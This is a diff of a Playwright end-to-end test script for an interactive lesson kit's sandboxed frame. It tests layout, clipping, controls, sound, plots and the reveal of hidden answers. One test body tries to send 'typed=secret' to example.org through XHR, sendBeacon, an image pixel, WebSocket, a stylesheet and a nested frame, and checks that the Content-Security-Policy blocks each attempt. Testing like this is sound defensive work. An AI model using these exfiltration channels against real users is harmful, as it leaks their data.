@@ -2,9 +2,10 @@
 // Kit, sandbox host and interactive builder tests (app/kit, 32-sandbox.js, 33-interactive.js).
 // A plain node script: builds a partial page (core + 32 + 33), drives it with Playwright through
 // tools/harness, and exits non-zero on any failure. Screenshots of every exemplar at 360 / 1280 px,
-// light and dark, land in tests/out/kit/ for review by eye.
+// light and dark, opening and moved, land in tests/out/kit/ for review by eye.
 //   node tests/e2e/kit.spec.mjs
 import { openApp, taskOf, ROOT } from '../../tools/harness/page.mjs';
+import { movedValue } from '../../tools/eval/render.mjs';
 import { readFileSync, readdirSync, mkdirSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { spawnSync } from 'node:child_process';
@@ -36,7 +37,7 @@ const kitJs = readFileSync(join(ROOT, 'app', 'kit', 'kit.js'), 'utf8');
 const kitMd = readFileSync(join(ROOT, 'app', 'kit', 'KIT.md'), 'utf8');
 expect('kit.js has no closing script tag or HTML comment opener', !/<\/script|<!--/i.test(kitJs));
 const words = kitMd.split(/\s+/).filter(Boolean).length;
-expect('KIT.md is at most 1800 words (' + words + ')', words <= 1800);
+expect('KIT.md is at most 2000 words (' + words + ')', words <= 2000);
 const exDir = join(ROOT, 'app', 'kit', 'examples');
 const examples = readdirSync(exDir).filter((f) => f.endsWith('.html')).sort().map((f) => {
   const body = readFileSync(join(exDir, f), 'utf8');
@@ -44,7 +45,18 @@ const examples = readdirSync(exDir).filter((f) => f.endsWith('.html')).sort().ma
   return { name: f.replace(/\.html$/, ''), kind: m && m[1], body };
 });
 expect('exemplars declare their kind on line 1', examples.length >= 3 && examples.every((e) => e.kind), examples.map((e) => e.name + ':' + e.kind));
-expect('exemplars cover quantity, process and mechanism', ['quantity', 'process', 'mechanism'].every((k) => examples.some((e) => e.kind === k)));
+expect('exemplars cover every idea kind but skill', ['quantity', 'process', 'mechanism', 'structure', 'history', 'concept'].every((k) => examples.some((e) => e.kind === k)), examples.map((e) => e.kind));
+// Every CSS variable a body could see (kit.css :root) is documented, and every one the exemplars use exists.
+const kitCss = readFileSync(join(ROOT, 'app', 'kit', 'kit.css'), 'utf8');
+const rootVars = [...((kitCss.match(/:root\s*\{([\s\S]*?)\}/) || [])[1] || '').matchAll(/--k-([a-z0-9-]+)\s*:/g)].map((m) => m[1]).filter((v) => v !== 'fs' && v !== 'mono');
+const undocumented = rootVars.filter((v) => !kitMd.includes('`' + v + '`') && !kitMd.includes('--k-' + v) && !(/^cat\d$/.test(v) && kitMd.includes('`cat1`-`cat4`')));
+expect('KIT.md documents every kit CSS variable', !undocumented.length, undocumented);
+const used = [...new Set(examples.concat([{ body: kitMd }]).flatMap((e) => [...e.body.matchAll(/var\(--k-([a-z0-9-]+)\)/g)].map((m) => m[1])))];
+expect('the exemplars use only variables the kit defines', used.every((v) => rootVars.includes(v)), used.filter((v) => !rootVars.includes(v)));
+expect('KIT.md documents the new APIs and rules',
+  ['k-after-move', 'K.afterMove', 'K.moved', 'afterMove: true', 'K.button', 'K.sound.tone', 'K.labels', 'K.stage', '`shade`', 'between', 'decimals', '`cat1`', 'amber-line', 'fill2'].every((w) => kitMd.includes(w)) &&
+  /source` may ONLY be a URL from the lesson's own/.test(kitMd) && /Never describe colours by lightness/.test(kitMd) && /at most two short sentences/.test(kitMd) &&
+  /conditionally/.test(kitMd));
 const kitExample = (kitMd.match(/```html\n([\s\S]*?)```/) || [])[1] || '';
 expect('KIT.md contains a complete example', /K\.ready\(\)/.test(kitExample));
 const pageHtml = readFileSync(PAGE, 'utf8');
@@ -107,6 +119,13 @@ function body(js, o = {}) {
     (o.noReady ? '' : 'K.ready();\n') + '</script>\n';
 }
 const plain = "K.model((p) => ({ y: p.a * 2 }));";
+// A six-option choice whose model breaks at one option.
+const choiceBody = '<div class="k-controls" id="c"></div><div class="k-readouts" id="o"></div><script>\n' +
+  "K.choice({ id: 'pick', label: 'Pick', value: 1, options: ['a', 'b', 'c', 'd', { value: 'e', label: 'Label E' }, 'f'], into: '#c' });\n" +
+  "K.readout({ id: 'y', label: 'Y', into: '#o' });\n" +
+  "K.model((p) => ({ y: p.pick === 'e' ? NaN : 1 }));\n" +
+  "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>";
+
 
 // ---------- broken bodies are caught (their own errors are expected, so a separate page) ----------
 section('self-test catches broken bodies');
@@ -163,7 +182,304 @@ section('self-test catches broken bodies');
   r = await test('<script>const t = Date.now(); while (Date.now() - t < 1500) {}</script>', { widths: [340], timeout: 600 });
   expect('a body that never answers times out as a failing report', !r.ok && has(r.errors, /did not load within/), r.errors);
   expect('srcdoc() refuses an oversized body', await app.page.evaluate(() => { try { U.sandbox.srcdoc('x'.repeat(160 * 1024)); return false; } catch (e) { return e.code === 'too_large'; } }));
+
+  // Clipped text (cut off, ellipsised, spilling, outside an SVG, labels over each other).
+  r = await test(body(plain, { html: '<div id="pill" style="width:80px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">lungs breathe air in</div>' }));
+  expect('an ellipsised label fails as clipped text, naming it', !r.ok && has(r.clipped, /"lungs breathe air in" is cut off by <div#pill> \(shortened with "…"/), r.clipped);
+  r = await test(body(plain, { html: '<div id="box" style="width:150px;height:22px;overflow:hidden;line-height:22px">one line, then a second line that is hidden</div>' }));
+  expect('text cut off at the bottom of a fixed-height box fails', !r.ok && has(r.clipped, /cut off by <div#box> \(cut off at the bottom\)/), r.clipped);
+  r = await test(body(plain + "\nK.update((p) => { document.getElementById('lab').textContent = p.a > 0.9 ? '181 for every 120 wobbles' : '3 for 2'; });",
+    { html: '<div id="lab" style="width:120px;overflow:hidden;white-space:nowrap;font-weight:700"></div>' }));
+  expect('text that clips only at the top of a slider is caught, with the setting', !r.ok && has(r.clipped, /"181 for every 120 wobbles" is cut off .*\(at a = 1\.0/), r.clipped);
+  r = await test(body(plain, { html: '<div id="spill" style="width:60px;white-space:nowrap">a no-wrap line spilling out</div>' }));
+  expect('a no-wrap line spilling out of its box fails', !r.ok && has(r.clipped, /spills out of <div#spill>/), r.clipped);
+  r = await test(body(plain, { html: '<svg viewBox="0 0 100 40" width="100%"><text x="70" y="20" font-size="10">past the edge</text></svg>' }));
+  expect('SVG text running outside its viewBox fails', !r.ok && has(r.clipped, /SVG text "past the edge" runs outside its drawing \(right by \d+px\)/), r.clipped);
+  r = await test(body(plain + "\nK.update((p) => { document.getElementById('b2').setAttribute('x', p.a > 0.7 ? 32 : 75); });",
+    { html: '<svg viewBox="0 0 120 40" width="100%"><text x="30" y="20" font-size="10">swap</text><text id="b2" x="75" y="20" font-size="10">drags back</text></svg>' }));
+  expect('SVG labels printed over each other at some setting fail', !r.ok && has(r.clipped, /SVG labels "swap" and "drags back" are printed over each other \(at a = 0\.8/), r.clipped);
+  // Common patterns that are not clipping.
+  const fine = body(plain + "\nconst rr = K.readout({ id: 'words', label: 'Pattern', into: '#o' }); K.update(() => rr.set('181 for every 120'));",
+    { html: '<div class="panel" style="overflow:hidden;border-radius:12px"><p>Rounded panel with ordinary wrapping text that is long enough to wrap onto several lines.</p></div>' +
+      '<svg viewBox="0 0 200 60" width="100%" role="img" aria-label="x"><text x="0" y="12" font-size="12">top-left label</text><text x="200" y="58" text-anchor="end" font-size="12">bottom-right label</text>' +
+      '<text x="100" y="35" text-anchor="middle" font-size="12" stroke="white" stroke-width="3">halo</text><text x="100" y="35" text-anchor="middle" font-size="12">halo</text></svg>' +
+      '<p class="caption" style="white-space:nowrap;overflow:hidden">short caption</p><button class="k-btn">A button</button><div class="k-bar-track" style="width:200px"><i style="width:50%"></i></div>' });
+  r = await test(fine);
+  expect('ordinary bodies (panels, edge labels, halos, long readout text) are not flagged', r.ok && !r.clipped.length, { clipped: r.clipped, errors: r.errors, sweep: r.sweep.problems });
+
+  // The model's outputs are numbers or short strings.
+  r = await test(body("K.model((p) => ({ y: p.a, order: ['x', 'y'] }));"));
+  expect('a model output that is a list fails', !r.ok && has(r.sweep.problems, /returned an array for "order"/), r.sweep);
+
+  // Kept-until-moved parts are checked too.
+  r = await test(body(plain, { html: '<p class="k-after-move" id="ans" style="width:90px;overflow:hidden;white-space:nowrap">the hidden answer is long</p>' }));
+  expect('clipped text inside a k-after-move element is caught (revealed for the test)', !r.ok && has(r.clipped, /the hidden answer is long/), r.clipped);
+  r = await test(body(plain + "\nK.update(() => { if (K.moved) throw new Error('only after a move'); });"));
+  expect('an update that throws only once Dan has moved is caught', !r.ok && has(r.sweep.problems, /only after a move/), r.sweep);
+
+  // Choice controls: every option swept, reported with its options.
+  r = await test(choiceBody);
+  expect('a choice is swept through every option (a NaN at option "e" is caught by its label)', !r.ok && has(r.sweep.problems, /readout "y" was given NaN \(at pick = "Label E"\)/), r.sweep);
+  expect('the report lists the choice with its options', r.controls.includes('pick') && JSON.stringify((r.inputs || [])[0] && r.inputs[0].options) === '["a","b","c","d","e","f"]' && r.inputs[0].value === 'b', r.inputs);
+
+  // Buttons and animations are exercised.
+  r = await test(body(plain + "\nK.button({ label: 'Shout', into: '#c', press: () => { throw new Error('shout failed'); } });"));
+  expect('a K.button whose press throws is caught', !r.ok && has(r.sweep.problems, /K\.button "Shout" threw .*shout failed.*\(at pressing "Shout"/), r.sweep);
+  r = await test(body(plain + "\nlet tt = 0; const sp = K.readout({ id: 'speed', label: 'Speed', into: '#o' });\nK.anim({ label: 'Go', into: '#c', step: (dt) => { tt += dt; sp.set(tt > 1.2 ? NaN : tt); } });"));
+  expect('an animation that produces NaN after a second is caught', !r.ok && has(r.sweep.problems, /readout "speed" was given NaN \(at playing "Go"/), r.sweep);
+  expect('the report lists the actions', JSON.stringify(r.actions) === '["Go"]', r.actions);
+
+  // Sound: calls are checked (without sound) when the self-test presses the button.
+  r = await test(body(plain + "\nK.button({ label: 'Hear it', into: '#c', press: () => K.sound.tone(NaN, { dur: 1 }) });"));
+  expect('K.sound.tone with a bad frequency is caught when its button is pressed', !r.ok && has(r.sweep.problems, /K\.sound\.tone was given a frequency of NaN/), r.sweep);
+  r = await test(body(plain + "\nK.button({ label: 'Hear it', into: '#c', press: () => K.sound.chord([261.63, 329.63, 392], { dur: 1.2, stagger: 0.1 }) });"));
+  expect('a good K.sound chord on a button passes quietly', r.ok && !(r.warnings || []).length, r);
+  r = await test(body(plain + "\nconst hear = document.createElement('button'); hear.textContent = 'Hear'; hear.onclick = () => K.sound.tone(440); K.$('#c').appendChild(hear);"));
+  expect('K.sound used outside any K.button gets advice', has(r.warnings, /K\.sound is used but no K\.button press played anything/), r.warnings);
+
+  // Phone layout: the first control must not be a screen away from the main figure.
+  const far = body(plain + "\nconst pf = K.plot('#pf', { x: { min: 0, max: 1 }, y: { min: 0, max: 2 } }); K.update((p) => pf.draw({ series: [{ fn: (x) => 2 * x }] }));",
+    { html: '<div id="pf"></div><div style="height:700px" class="panel">a tall second figure</div>' });
+  r = await test(far);
+  expect('a control far below the main figure on a phone gets advice naming K.stage', has(r.warnings, /first control starts \d+ px below the top of the main figure.*K\.stage/), r.warnings);
+  r = await test(far.replace("K.update((p) =>", "K.stage('#pf', '#c'); K.update((p) =>"));
+  expect('...and K.stage puts the controls under the figure', !has(r.warnings, /main figure/), r.warnings);
+
+  // Plot shading needs a real edge.
+  r = await test(body(plain + "\nconst ps = K.plot(K.el('div'), { x: { min: 0, max: 1 }, y: { min: 0, max: 2 } }); document.body.appendChild(ps.el);\nK.update(() => ps.draw({ series: [{ fn: (x) => x, label: 'low' }], shade: [{ between: ['low', 'high'] }] }));"));
+  expect('a shade between a series that does not exist is caught', !r.ok && has(r.sweep.problems, /no series is labelled "high"/), r.sweep);
+
+  // No network from a body, even when it gets around the kit's fetch().
+  // A request that got past the policy would reach this route (blocked ones never do).
+  const leaks = [];
+  await app.context.route(/example\.(org|net)/, (q) => { leaks.push(q.request().url()); q.fulfill({ status: 200, body: '' }); });
+  const sneaky = '<div id="out"></div><script>\n' +
+    "window.__v = []; document.addEventListener('securitypolicyviolation', (e) => window.__v.push(e.effectiveDirective));\n" +
+    "try { delete window.fetch; } catch (e) {}\n" +
+    "try { const x = new XMLHttpRequest(); x.open('GET', 'https://example.org/xhr?typed=secret'); x.send(); } catch (e) {}\n" +
+    "try { navigator.sendBeacon('https://example.org/beacon', 'typed=secret'); } catch (e) {}\n" +
+    "try { new Image().src = 'https://example.org/px.gif?typed=secret'; } catch (e) {}\n" +
+    "try { new WebSocket('wss://example.net/ws'); } catch (e) {}\n" +
+    "try { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://example.org/s.css'; document.head.appendChild(l); } catch (e) {}\n" +
+    "try { const f = document.createElement('iframe'); f.srcdoc = '<script>fetch(\"https://example.org/inner\").catch(() => {});<' + '/script>'; document.body.appendChild(f); } catch (e) {}\n" +
+    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>";
+  const v = await app.page.evaluate(async (html) => {
+    const box = document.body.appendChild(document.createElement('div'));
+    const m = U.sandbox.mount(box, { html });
+    await m.ready;
+    await new Promise((res) => setTimeout(res, 1200));
+    return null;
+  }, sneaky).then(async () => {
+    const fr = app.page.frames().find((f) => f !== app.page.mainFrame() && f.url() === 'about:srcdoc');
+    return fr ? fr.evaluate(() => window.__v) : null;
+  });
+  expect('a body cannot reach the network: XHR, beacon, image, WebSocket, stylesheet and a nested frame are all blocked', leaks.length === 0 && Array.isArray(v) && ['connect-src', 'img-src', 'style-src-elem'].every((d) => v.includes(d)), { leaks, violations: v });
+  expect('srcdoc starts with the Content-Security-Policy', await app.page.evaluate(() => /^<!doctype html><html lang="en"><head><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'/.test(U.sandbox.srcdoc('<p>x</p>'))));
+  app.errors.splice(0);
   await app.close();
+}
+
+// ---------- the kit in a live frame: reveal, choices, layout, colours, plots, sound, reach ----------
+section('the kit in a live frame');
+{
+  const app = await openApp({ width: 360, height: 800, file: PAGE });
+  await app.page.goto(app.url('#/'));
+  await app.page.evaluate(() => U.rt.ready);
+  // Mount a body in a fresh host box; returns its frame.
+  async function live(html, key = 'm') {
+    await app.page.evaluate(async ([h, k]) => {
+      if (window[k]) window[k].destroy();
+      const box = document.body.appendChild(document.createElement('div'));
+      box.style.cssText = 'max-width:720px;margin:16px auto;padding:0 16px';
+      window[k] = U.sandbox.mount(box, { html: h });
+      await window[k].ready;
+      await new Promise((r) => setTimeout(r, 300));
+    }, [html, key]);
+    return app.page.frames().find((f) => f !== app.page.mainFrame() && f.url() === 'about:srcdoc' && !f.isDetached());
+  }
+  const host = (fn, arg) => app.page.evaluate(fn, arg);
+
+  // Kept until Dan moves.
+  const hidden = body(plain + "\nwindow.__after = 0; K.afterMove(() => { window.__after++; });\nK.readout({ id: 'ans', label: 'The answer', afterMove: true, into: '#o' });\n" +
+    "K.model((p) => ({ y: p.a * 2, ans: p.a * 10 }));\nK.update((p) => { K.$('#say').textContent = K.moved ? 'revealed' : 'guess first'; });",
+    { html: '<p class="k-after-move" id="secret">The answer is here</p><p id="say"></p>' }).replace("K.model((p) => ({ y: p.a * 2 }));", '');
+  let fr = await live(hidden);
+  const state = () => fr.evaluate(() => ({ vis: getComputedStyle(K.$('#secret')).visibility, h: K.$('#secret').offsetHeight, ans: K.$('[data-id=ans] .k-readout-value').textContent,
+    say: K.$('#say').textContent, moved: K.moved, after: window.__after }));
+  let st = await state();
+  expect('before a move: k-after-move is hidden but keeps its space, the readout shows "?", K.moved is false',
+    st.vis === 'hidden' && st.h > 10 && st.ans === '?' && st.say === 'guess first' && !st.moved && st.after === 0, st);
+  const selfRep = await host(() => window.m.selftest());
+  st = await state();
+  expect('the self-test does not count as a move (all still hidden after it)', selfRep.ok && st.vis === 'hidden' && st.ans === '?' && !st.moved && st.after === 0, { st, selfRep });
+  const got = await host(() => window.m.get());
+  expect('the host still reads the real value while it is hidden', got.outputs.ans === 5, got);
+  await fr.focus('#k-a');
+  await app.page.keyboard.press('ArrowRight');
+  await app.page.waitForTimeout(200);
+  st = await state();
+  expect('the first slider move reveals everything and runs K.afterMove once', st.vis === 'visible' && st.ans === '6' && st.say === 'revealed' && st.moved && st.after === 1, st);
+  await app.page.keyboard.press('ArrowRight');
+  await app.page.waitForTimeout(150);
+  expect('...and only once', (await state()).after === 1);
+  fr = await live(hidden);
+  await host(() => window.m.set('a', 0.2));
+  st = await state();
+  expect('a host set() counts as a move too', st.vis === 'visible' && st.ans === '2' && st.moved, st);
+
+  // Choices by value, label or index, from the host.
+  fr = await live(choiceBody.replace("p.pick === 'e' ? NaN : 1", "['a', 'b', 'c', 'd', 'e', 'f'].indexOf(p.pick)"));
+  let ch = await host(() => window.m.get());
+  expect('a choice opens on the option its index names (value: 1 -> "b")', ch.params.pick === 'b' && ch.outputs.y === 1, ch);
+  ch = await host(() => window.m.set('pick', 3));
+  expect('host set() by index', ch.params.pick === 'd' && ch.outputs.y === 3, ch);
+  ch = await host(() => window.m.set('pick', 'Label E'));
+  expect('host set() by label', ch.params.pick === 'e', ch);
+  ch = await host(() => window.m.set('pick', 'f'));
+  expect('host set() by value', ch.params.pick === 'f', ch);
+  const badPick = await host(() => window.m.set('pick', 'zz').then(() => 'resolved', (e) => e.code));
+  expect('host set() to a missing option rejects', badPick === 'kit_error', badPick);
+  const ins = await host(() => window.m.inputs());
+  expect('inputs() lists the choice and its options', ins.inputs[0].kind === 'choice' && ins.inputs[0].options.length === 6 && ins.inputs[0].labels[4] === 'Label E', ins);
+  await fr.click('.k-seg button:nth-child(1)');
+  await app.page.waitForTimeout(150);
+  expect('tapping an option sets it', (await host(() => window.m.get())).params.pick === 'a');
+
+  // Small-screen layout at 340 px wide.
+  const layout = '<div class="k-controls" id="c"></div><div class="k-readouts" id="o"></div><script>\n' +
+    "K.control({ id: 'hi', label: \"High note's wobbles per second\", min: 120, max: 250, step: 1, value: 181, unit: 'per second', into: '#c' });\n" +
+    "K.readout({ id: 'n', label: 'Times a second they start a wobble together', into: '#o' });\n" +
+    "K.readout({ id: 'gap', label: 'Low-note wobbles between line-ups', into: '#o' });\n" +
+    "K.readout({ id: 'ratio', label: 'High wobbles for every low wobbles', into: '#o' });\n" +
+    "const g = (a, b) => b ? g(b, a % b) : a;\nK.model((p) => ({ n: g(p.hi, 120), gap: 120 / g(p.hi, 120), ratio: p.hi + ' for every 120' }));\n" +
+    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>";
+  fr = await live(layout);
+  const lay = await fr.evaluate(() => {
+    const sc = [...document.querySelectorAll('.k-scale span')].map((s) => s.getBoundingClientRect());
+    const lh = (el) => parseFloat(getComputedStyle(el).lineHeight);
+    const labels = [...document.querySelectorAll('.k-readout-label')].map((l) => Math.round(l.getBoundingClientRect().height / lh(l)));
+    const vals = [...document.querySelectorAll('.k-readout-value')].map((v) => ({ text: v.textContent, cut: v.scrollWidth > v.clientWidth + 1, bottom: Math.round(v.getBoundingClientRect().bottom) }));
+    const head = document.querySelector('.k-field-label');
+    return { width: document.documentElement.clientWidth, scale: sc.map((r) => ({ h: Math.round(r.height), l: r.left, r: r.right })), labels, vals, headLines: Math.round(head.getBoundingClientRect().height / lh(head)) };
+  });
+  expect('at phone width the slider end labels sit on one line each and do not collide',
+    lay.scale.every((r) => r.h <= 20) && lay.scale[0].r + 6 <= lay.scale[1].l, lay);
+  expect('readout labels wrap to two lines at most', lay.labels.every((n) => n <= 2), lay.labels);
+  expect('readout values are never cut ("181 for every 120" shown whole)', lay.vals.every((v) => !v.cut) && lay.vals.some((v) => v.text === '181 for every 120'), lay.vals);
+  expect('the control label keeps to two lines beside its value', lay.headLines <= 2, lay.headLines);
+  const layRep = await host(() => window.m.selftest());
+  expect('...and the layout body passes its self-test with nothing clipped', layRep.ok && !layRep.clipped.length, layRep.clipped);
+
+  // Rounding.
+  const fmt = await fr.evaluate(() => [K.fmt(2.5), K.fmt(1628.89), K.fmt(5), K.fmt(0.1234), K.fmt(12.345), K.fmt(99.96), K.fmt(3, { decimals: 2 }), K.fmt(-0.5), K.fmt(2e16), K.fmt(77.57, { decimals: 2, prefix: '£' })]);
+  expect('K.fmt rounds sensibly: whole numbers whole, 3 significant figures kept, decimals honoured',
+    JSON.stringify(fmt) === JSON.stringify(['2.50', '1,629', '5', '0.123', '12.3', '100', '3.00', '−0.500', '2 × 10¹⁶', '£77.57']), fmt);
+  fr = await live(body("K.model((p) => ({ y: p.a * 155.5 }));\nconst d2 = K.readout({ id: 'money', label: 'Money', prefix: '£', decimals: 2, into: '#o' });\nK.update(() => d2.set(77.571));"));
+  const rd = await fr.evaluate(() => ({ y: K.$('[data-id=y] .k-readout-value').textContent, money: K.$('[data-id=money] .k-readout-value').textContent }));
+  expect('readouts use that rounding (77.75 -> "77.8"; decimals: 2 -> "£77.57")', rd.y === '77.8' && rd.money === '£77.57', rd);
+
+  // Colours: the dark fills are clearly visible against the dark page.
+  await app.page.evaluate(() => { document.documentElement.dataset.muTheme = 'dark'; });
+  await app.page.waitForTimeout(300);
+  const pal = await fr.evaluate(() => {
+    const lum = (c) => { const p = c.match(/[\d.]+/g).slice(0, 3).map(Number).map((v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); }); return 0.2126 * p[0] + 0.7152 * p[1] + 0.0722 * p[2]; };
+    const contrast = (a, b) => { const x = lum(a), y = lum(b); return (Math.max(x, y) + 0.05) / (Math.min(x, y) + 0.05); };
+    const css = (name) => { const d = document.createElement('div'); d.style.color = 'var(--k-' + name + ')'; document.body.appendChild(d); const c = getComputedStyle(d).color; d.remove(); return c; };
+    const bg = css('bg'), out = { dark: K.theme.dark };
+    ['fill1', 'fill2', 'fill3', 'hl', 'amber-line', 'cat1', 'cat2', 'cat3', 'cat4', 'accent2'].forEach((k) => { out[k] = +contrast(css(k), bg).toFixed(2); });
+    out.alpha = K.color('accent2', 0.3);
+    out.inkOnFill2 = +contrast(css('ink'), css('fill2')).toFixed(2);
+    return out;
+  });
+  expect('dark mode: fills and highlights stand out from the page (contrast >= 1.6), lines and categories >= 3',
+    pal.dark && ['fill1', 'fill2', 'fill3', 'hl'].every((k) => pal[k] >= 1.6) && ['amber-line', 'cat1', 'cat2', 'cat3', 'cat4', 'accent2'].every((k) => pal[k] >= 3) && pal.inkOnFill2 >= 3.5, pal);
+  expect('K.color(role, alpha) gives a see-through colour', /^rgba\(\d+, \d+, \d+, 0\.3\)$/.test(pal.alpha), pal.alpha);
+  await app.page.evaluate(() => { document.documentElement.dataset.muTheme = 'light'; });
+  await app.page.waitForTimeout(300);
+  const palL = await fr.evaluate(() => ({ fill2: getComputedStyle(document.documentElement).getPropertyValue('--k-fill2').trim(), amberLine: K.theme.c.amberLine, dark: K.theme.dark }));
+  expect('light mode keeps calm fills and a strong amber line', !palL.dark && palL.fill2 === '#F8D47A' && palL.amberLine === '#B7791F', palL);
+
+  // Plots: shading between lines, labels clear of lines.
+  const plotBody = '<div id="pl"></div><div class="k-controls" id="c"></div><script>\n' +
+    "K.control({ id: 'k', label: 'k', min: 0.2, max: 1, step: 0.1, value: 0.5, into: '#c' });\n" +
+    "const pl = K.plot('#pl', { x: { min: 0, max: 10, label: 'x' }, y: { min: 0, max: 10, label: 'y' } });\n" +
+    "K.update((p) => pl.draw({ series: [{ fn: (x) => x, label: 'upper' }, { fn: (x) => p.k * x, label: 'lower' }], shade: [{ between: ['upper', 'lower'], label: 'the gap' }, { between: ['lower', 0], x0: 0, x1: 2, color: 'fill1' }],\n" +
+    "  marks: [{ x: 5, y: 5, label: 'five, five' }], lines: [{ x: 9.6, label: 'near the edge' }] }));\n" +
+    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>";
+  fr = await live(plotBody);
+  const pinfo = await fr.evaluate(() => {
+    const api = K.$('#pl').__kplot, cv = api.canvas, c2 = cv.getContext('2d'), dpr = cv.width / cv.clientWidth;
+    const px = (x, y) => [...c2.getImageData(Math.round(api.x(x) * dpr), Math.round(api.y(y) * dpr), 1, 1).data];
+    const onLine = (l) => { for (let x = 0; x <= 10; x += 0.05) { const X = api.x(x), Y = api.y(x); if (X > l.x && X < l.x + l.w && Y > l.y && Y < l.y + l.h) return true; } return false; };
+    const labels = api.labels;
+    return { gap: px(8, 6), outside: px(2, 9), labels, markOnLine: labels.filter((l) => l.text === 'five, five').map(onLine)[0],
+      lineLabel: labels.find((l) => l.text === 'near the edge'), lineX: api.x(9.6), box: api.box, gapLabel: labels.find((l) => l.text === 'the gap') };
+  });
+  const tinted = (c) => c[3] > 40 && !(c[0] > 245 && c[1] > 245 && c[2] > 245);
+  expect('shade fills the gap between two series (and not outside it)', tinted(pinfo.gap) && !tinted(pinfo.outside), pinfo);
+  expect('the shade label is drawn', !!pinfo.gapLabel, pinfo.labels);
+  expect('a mark label sits clear of the line through its dot', pinfo.markOnLine === false, pinfo.labels);
+  expect('a reference line label sits beside its line (not across it), inside the plot',
+    pinfo.lineLabel && (pinfo.lineLabel.x + pinfo.lineLabel.w <= pinfo.lineX || pinfo.lineLabel.x >= pinfo.lineX) && pinfo.lineLabel.x >= pinfo.box.x, pinfo);
+
+  // K.labels nudges a label off a fixed one.
+  fr = await live('<svg id="sv" viewBox="0 0 200 60" width="100%"><text x="100" y="30" text-anchor="middle" font-size="12">fixed label</text><g id="lg"></g></svg><div class="k-controls" id="c"></div><script>\n' +
+    "K.control({ id: 'a', label: 'A', min: 0, max: 1, step: 0.5, value: 0.5, into: '#c' });\nK.update(() => K.labels('#lg', [{ x: 100, y: 30, text: 'moving label' }, { x: 199, y: 12, text: 'edge label' }]));\n" +
+    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>");
+  const lb = await fr.evaluate(() => { const t = [...document.querySelectorAll('text')].map((e) => e.getBoundingClientRect()); const s = K.$('#sv').getBoundingClientRect();
+    const ov = (a, b) => a.left < b.right && b.left < a.right && a.top < b.bottom && b.top < a.bottom; return { overlap: ov(t[0], t[1]), inside: t.every((r) => r.left >= s.left - 1 && r.right <= s.right + 1) }; });
+  const lbRep = await host(() => window.m.selftest());
+  expect('K.labels moves a label off another and keeps labels inside the drawing', !lb.overlap && lb.inside && lbRep.ok, { lb, clipped: lbRep.clipped });
+
+  // Sound in the real frame: plays after a press, never before.
+  fr = await live(body(plain + "\nK.sound.tone(440);\nK.button({ label: 'Hear it', into: '#c', press: () => K.sound.chord([261.63, 329.63, 392], { dur: 0.5 }) });"));
+  const before = await fr.evaluate(() => ({ playing: K.sound.playing }));
+  await fr.click('button.k-btn');
+  await app.page.waitForTimeout(120);
+  const after = await fr.evaluate(() => ({ playing: K.sound.playing, muted: K.sound.muted, ready: K.sound.ready }));
+  const sw = await host(() => window.m.selftest());
+  expect('K.sound stays silent on load (with advice) and plays after a press, under the CSP', !before.playing && after.playing && after.ready && !after.muted && sw.warnings.some((w) => /before Dan pressed anything/.test(w)), { before, after, w: sw.warnings });
+  await fr.evaluate(() => K.sound.stop());
+
+  // Figures are capped on desktop and centred, and fill the phone.
+  const figBody = '<svg id="fig" viewBox="0 0 340 200" width="100%" role="img" aria-label="f"><rect width="340" height="200" fill="var(--k-panel)"/><text x="10" y="20" font-size="12">label</text></svg>' +
+    '<p>Icon <svg id="icon" viewBox="0 0 16 16" width="16" height="16"><circle cx="8" cy="8" r="6"/></svg> inline</p>' + body(plain);
+  fr = await live(figBody);
+  const phone = await fr.evaluate(() => ({ w: K.$('#fig').getBoundingClientRect().width, col: document.body.clientWidth - 32, fig: K.$('#fig').classList.contains('k-fig'), icon: K.$('#icon').classList.contains('k-fig') }));
+  expect('at phone width a figure fills the column', phone.fig && !phone.icon && Math.abs(phone.w - phone.col) <= 2, phone);
+  await app.close();
+
+  const wide = await openApp({ width: 1280, height: 900, file: PAGE });
+  await wide.page.goto(wide.url('#/'));
+  await wide.page.evaluate(async (html) => {
+    await U.rt.ready;
+    const box = document.body.appendChild(document.createElement('div'));
+    box.style.cssText = 'max-width:720px;margin:16px auto;padding:0 16px';
+    window.m = U.sandbox.mount(box, { html });
+    await window.m.ready;
+    await new Promise((r) => setTimeout(r, 300));
+  }, figBody);
+  const wf = wide.page.frames().find((f) => f !== wide.page.mainFrame());
+  const desk = await wf.evaluate(() => { const r = K.$('#fig').getBoundingClientRect(); return { w: r.width, left: r.left, right: document.documentElement.clientWidth - r.right, page: document.documentElement.clientWidth }; });
+  expect('on desktop a 340-wide figure is capped near 1.45x (493 px) and centred', Math.abs(desk.w - 493) <= 2 && Math.abs(desk.left - desk.right) <= 2, desk);
+
+  // reach(): can the lesson's target be met by moving its control?
+  const brayton = examples.find((e) => e.kind === 'quantity').body;
+  const sorter = examples.find((e) => e.kind === 'concept').body;
+  const reach = await wide.page.evaluate(async ([b, srt]) => ({
+    yes: await U.sandbox.reach(b, { control: 'r', output: 'eff', target: 60, tolerance: 1.5 }),
+    no: await U.sandbox.reach(b, { control: 'r', output: 'eff', target: 80, tolerance: 1 }),
+    choice: await U.sandbox.reach(srt, { control: 'by', output: 'alike', target: 100, tolerance: 0 }),
+    missing: await U.sandbox.reach(b, { control: 'nope', output: 'eff', target: 1, tolerance: 1 }),
+    mounted: await U.sandbox.reach(window.m, { control: 'a', output: 'y', target: 1.4, tolerance: 0.01 }),
+  }), [brayton, sorter]);
+  expect('reach(): a reachable target reports the setting that meets it', reach.yes.reachable && reach.yes.best.value === 25 && near(reach.yes.best.output, 60.1, 0.1) && reach.yes.tried === 50, reach.yes);
+  expect('reach(): an unreachable target says so, with the closest it gets', !reach.no.reachable && reach.no.best.value === 50 && near(reach.no.best.output, 67.3, 0.05), reach.no);
